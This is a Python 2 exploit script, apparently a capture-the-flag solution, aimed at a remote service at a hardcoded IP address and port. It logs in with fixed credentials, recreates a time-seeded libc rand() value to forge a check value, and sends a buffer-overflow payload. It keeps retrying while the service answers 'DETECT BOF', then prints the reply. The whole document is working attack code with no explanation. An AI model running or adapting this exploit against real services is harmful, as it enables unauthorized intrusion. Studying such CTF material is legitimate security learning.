from math import *
import socket
import time
from ctypes import CDLL
libc = CDLL('libc.so.6')
host = '203.162.88.114'
port = 44444
sent1 = "2\n"
sent2 = "usertrollgame\n"
sent3 = "passwordtrollgame\n"
sent4 = "passwordtrollgame\n"
sent5 = "1\n"
sent7 = "trollpassword\n"

def re(a):
	a = '0000000'+a.encode('hex')
	a = a[-8:]
	b = ''
	for i in range(4):
		b = a[i*2:i*2+2] + b
	return b.decode('hex')

def pwn():
	sent6 = "a"*10+"\00"*118+"tmp"+"\x00"*12+"\x35\x68\x66\x66\n"
	s = socket.socket()
	s.connect((host,port))
	now = int(floor(time.time()))
	tm = ''
	libc.srand(now)
	c = 0
	while c<4:
		ch =  libc.rand()%0x7f
		if ch >0x20 and ch <0x7f:
			tm += chr(ch)
			c += 1
	sent6 = sent6.replace('tmp',tm)
	s.recv(1024)
	s.recv(1024)
	s.send(sent1)
	s.recv(1024)
	s.send(sent2)
	s.recv(1024)
	s.send(sent3)
	s.recv(1024)
	s.send(sent4)
	s.recv(1024)
	s.send(sent5)
	s.recv(1024)
	s.send(sent6)
	s.recv(1024)
	s.send(sent7)
	return s.recv(1024)	

def main():
	while True:
		rs = pwn()
		if "DETECT BOF" in rs:
			continue
		else: 
			print rs
			break

if __name__=="__main__":
	main()